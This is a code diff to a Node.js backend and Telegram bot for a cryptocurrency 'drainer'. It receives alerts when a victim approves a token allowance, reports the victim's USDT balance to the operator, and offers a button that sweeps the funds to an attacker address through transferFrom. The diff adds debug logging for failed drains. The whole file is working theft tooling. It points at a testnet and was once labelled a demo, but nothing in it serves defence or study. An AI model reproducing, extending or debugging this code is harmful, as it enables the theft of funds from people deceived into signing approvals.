@@ -8,18 +8,28 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+// ==========================================
+// TRONWEB INITIALIZATION
+// ==========================================
 const tronWeb = new TronWeb({
   fullHost: 'https://api.shasta.trongrid.io',
   privateKey: process.env.ATTACKER_PRIVATE_KEY 
 });
 
+// ADD THIS LINE RIGHT HERE:
+console.log("🔍 BACKEND ATTACKER ADDRESS IS:", tronWeb.defaultAddress.base58);
+
 const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
-const ATTACKER_ADDRESS = tronWeb.defaultAddress.base58;
+const ATTACKER_ADDRESS = tronWeb.defaultAddress.base58; // Derived directly from the private key
+
 const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
 const fmt = (n) => Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
 
+// ==========================================
+// 1. ALERT ENDPOINT (Frontend calls this)
+// ==========================================
 app.post('/api/alert', async (req, res) => {
   const { victimAddress, txHash } = req.body;
   console.log(`[ALERT] Received approval from ${victimAddress}`);
@@ -29,7 +39,7 @@ app.post('/api/alert', async (req, res) => {
     const bal = await token.balanceOf(victimAddress).call();
     const balanceNum = Number(bal.toString()) / 1e6;
 
-    const message = `🚨 *PRESIDENTIAL DEMO: VICTIM APPROVED* 🚨\n\n👤 Victim: \`${victimAddress}\`\n💰 USDT Balance: **${fmt(balanceNum)}**\n🔗 [View Tx](https://shasta.tronscan.org/#/transaction/${txHash})\n\nTap below to drain.`;
+    const message = `🚨 *VICTIM APPROVED* 🚨\n\n👤 Victim: \`${victimAddress}\`\n💰 USDT Balance: **${fmt(balanceNum)}**\n🔗 [View Approve Tx](https://shasta.tronscan.org/#/transaction/${txHash})\n\nTap below to drain.`;
     
     const keyboard = {
       inline_keyboard: [[
@@ -46,6 +56,9 @@ app.post('/api/alert', async (req, res) => {
   }
 });
 
+// ==========================================
+// 2. CHECK BALANCE ACTION
+// ==========================================
 bot.action(/bal_(.+)/, async (ctx) => {
   const addr = ctx.match[1];
   await ctx.answerCbQuery('Reading...');
@@ -56,6 +69,9 @@ bot.action(/bal_(.+)/, async (ctx) => {
   } catch (e) { ctx.editMessageText(`❌ Read failed.`); }
 });
 
+// ==========================================
+// 3. SWEEP ALL FUNDS ACTION (The Drain)
+// ==========================================
 bot.action(/sweep_(.+)/, async (ctx) => {
   const addr = ctx.match[1];
   await ctx.answerCbQuery('Initiating Drain...');
@@ -63,14 +79,22 @@ bot.action(/sweep_(.+)/, async (ctx) => {
 
   try {
     const token = await tronWeb.contract().at(TOKEN_ADDRESS);
+    
     const bal = BigInt((await token.balanceOf(addr).call()).toString());
     const allow = BigInt((await token.allowance(addr, ATTACKER_ADDRESS).call()).toString());
-    const amount = bal < allow ? bal : allow;
-
-    if (amount === 0n) {
-      return ctx.editMessageText(`❌ *Drain Failed.*\nBalance or Allowance is 0.`);
+    
+    // DEBUG LOG: If allowance is 0, this will show you exactly why in your Render logs
+    if (allow === 0n) {
+      console.log(`❌ DRAIN FAILED: Allowance is 0.`);
+      console.log(`   Victim Address: ${addr}`);
+      console.log(`   Backend Attacker Address (from key): ${ATTACKER_ADDRESS}`);
+      console.log(`   Frontend Approved Address: Check your frontend ATTACKER_WALLET variable!`);
+      return ctx.editMessageText(`❌ *Drain Failed.*\nAllowance is 0 for \`${ATTACKER_ADDRESS}\`.\nCheck Render logs for mismatch.`, { parse_mode: 'Markdown' });
     }
 
+    const amount = bal < allow ? bal : allow;
+
+    // EXECUTE TRANSFERFROM
     const tx = await token.transferFrom(addr, ATTACKER_ADDRESS, amount.toString()).send({ feeLimit: 100000000 });
     
     let info = await tronWeb.trx.getTransactionInfo(tx);
@@ -88,6 +112,10 @@ bot.action(/sweep_(.+)/, async (ctx) => {
   }
 });
 
+// ==========================================
+// START SERVER
+// ==========================================
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, () => console.log(`🛡️ Backend running on port ${PORT}`));
+
 bot.launch().then(() => console.log('✅ Telegram bot listening.'));
